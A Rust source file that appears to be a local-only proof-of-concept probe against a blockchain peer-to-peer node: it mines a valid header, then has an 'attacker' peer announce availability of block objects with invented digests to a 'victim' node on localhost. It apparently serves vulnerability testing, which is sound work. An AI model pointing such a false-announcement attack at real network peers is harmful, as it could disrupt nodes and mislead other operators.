//! Local-only probe: one native-valid direct-child header, invented object IDs.

use std::{path::PathBuf, sync::Arc, time::{Duration, SystemTime, UNIX_EPOCH}};

use anyhow::{bail, Context, Result};
use libp2p::Multiaddr;
use noid_chain::{
    block_header::{block_id, semantic_header_id},
    consensus::{
        difficulty::next_target,
        network::NetworkConfig,
        pow::search_pow,
        slot_expansion::expected_child_log_slots,
        validate_header,
    },
    storage::MdbxChainContext,
};
use noid_mempool::{AsyncMempool, ChainView, MempoolConfig};
use noid_p2p::{
    header_protocol::{HeaderAnnouncement, ProviderFlags},
    object_protocol::{BlockBodyClaimId, BlockBodyObjectId, TerminalClaimId, TerminalObjectId},
    BackgroundCapacity, NetworkCommand, NetworkEvent, NetworkTopics, P2PNetwork,
};
use tokio::sync::RwLock;

const BANK_ID: [u8; 32] = [
    0xad, 0x46, 0x3b, 0xd7, 0x6e, 0x27, 0xdf, 0x3c,
    0x0f, 0x41, 0x4f, 0x4f, 0xd7, 0x64, 0x0c, 0xfb,
    0x5c, 0x45, 0xcc, 0x7f, 0x3a, 0x09, 0xe4, 0x4a,
    0x2f, 0x7b, 0xc7, 0xa8, 0xb8, 0x69, 0x48, 0x5b,
];

fn now_unix() -> u64 {
    SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs()
}

fn mine(source: PathBuf, out: PathBuf) -> Result<()> {
    let ctx = MdbxChainContext::open_or_create(&source).context("open source chain")?;
    let parent = *ctx.tip_header();
    let anchor = ctx.anchor_info()?;
    let prev_timestamps = ctx.prev_timestamps()?;
    let finalized_active_counts = ctx.finalized_active_counts()?;
    let mut header = parent;
    header.height = parent.height + 1;
    header.prev_block_hash = block_id(&parent);
    header.timestamp = now_unix().max(parent.timestamp + 1);
    header.log_slots = expected_child_log_slots(parent.height, parent.log_slots, &finalized_active_counts);
    header.difficulty_target = next_target(
        anchor.anchor_height, anchor.anchor_timestamp, &anchor.anchor_target,
        header.height, parent.timestamp, header.timestamp,
    );
    header.nonce = 0;
    let mut cursor = 0u128;
    loop {
        if let Some(nonce) = search_pow(&header, cursor, 65_536) {
            header.nonce = nonce;
            break;
        }
        cursor += 65_536;
        if cursor >= 20_000_000 {
            bail!("bounded PoW search exhausted 20 million nonces");
        }
    }
    validate_header(
        &header, &parent, &prev_timestamps, &finalized_active_counts,
        now_unix(), anchor.anchor_height, anchor.anchor_timestamp, &anchor.anchor_target,
    ).context("native direct-child header validation")?;
    let announcement = HeaderAnnouncement {
        header,
        body: BlockBodyObjectId {
            claim: BlockBodyClaimId { height: header.height, block_hash: block_id(&header) },
            byte_digest: [0xa5; 32], encoded_len: 100,
        },
        terminal: TerminalObjectId {
            claim: TerminalClaimId { height: header.height, semantic_header_id: semantic_header_id(&header), proof_class: 0 },
            byte_digest: [0x5a; 32], encoded_len: 100,
        },
        providers: ProviderFlags::new(true, true, false),
    };
    let bytes = announcement.encode().context("encode invented inventory")?;
    std::fs::write(&out, bytes)?;
    println!("MINED height={} nonce={} hash={} source={} output={}",
        header.height, header.nonce, hex32(block_id(&header)), source.display(), out.display());
    Ok(())
}

fn hex32(bytes: [u8; 32]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

async fn announce(peer_dir: PathBuf, source: PathBuf, port: u16, victim_port: u16) -> Result<()> {
    tracing_subscriber::fmt().with_env_filter("info").init();
    std::fs::create_dir_all(&peer_dir)?;
    let bytes = std::fs::read(source)?;
    let announcement = HeaderAnnouncement::decode(&bytes).context("read announcement")?;
    let ctx = MdbxChainContext::open_or_create(&peer_dir).context("open attacker P2P store")?;
    let mempool = AsyncMempool::new(ChainView::from_mdbx(&ctx), MempoolConfig::default());
    let listen: Multiaddr = format!("/ip4/127.0.0.1/tcp/{port}").parse()?;
    let (network, task) = P2PNetwork::start(
        listen, vec![], Arc::new(RwLock::new(ctx)), mempool,
        NetworkTopics::for_network_cfg(&NetworkConfig::mainnet()),
        BANK_ID, peer_dir, BackgroundCapacity::Full,
    )?;
    let mut events = network.subscribe();
    let addr: Multiaddr = format!("/ip4/127.0.0.1/tcp/{victim_port}").parse()?;
    network.dial(addr).await;
    let connected = tokio::time::timeout(Duration::from_secs(25), async {
        loop {
            match events.recv().await {
                Ok(NetworkEvent::PeerConnected { peer, .. }) => break peer,
                Ok(_) => {}
                Err(error) => bail!("network event: {error:?}"),
            }
        }
    }).await.context("dispatchable peer timeout")??;
    println!("CONNECTED peer={connected}");
    network.cmd_tx.send(NetworkCommand::AnnounceAvailability { announcement }).await?;
    println!("ANNOUNCED height={} hash={}", announcement.header.height, hex32(block_id(&announcement.header)));
    tokio::time::sleep(Duration::from_secs(110)).await;
    task.abort();
    Ok(())
}

#[tokio::main(flavor = "multi_thread", worker_threads = 2)]
async fn main() -> Result<()> {
    let mut args = std::env::args().skip(1);
    match args.next().as_deref() {
        Some("mine") => mine(
            args.next().context("source directory")?.into(),
            args.next().context("announcement output")?.into(),
        ),
        Some("announce") => announce(
            args.next().context("attacker peer directory")?.into(),
            args.next().context("announcement input")?.into(),
            args.next().context("listen port")?.parse()?,
            args.next().context("victim port")?.parse()?,
        ).await,
        _ => bail!("usage: false-availability-probe mine SOURCE OUT | announce PEER_DIR INPUT LISTEN_PORT VICTIM_PORT"),
    }
}
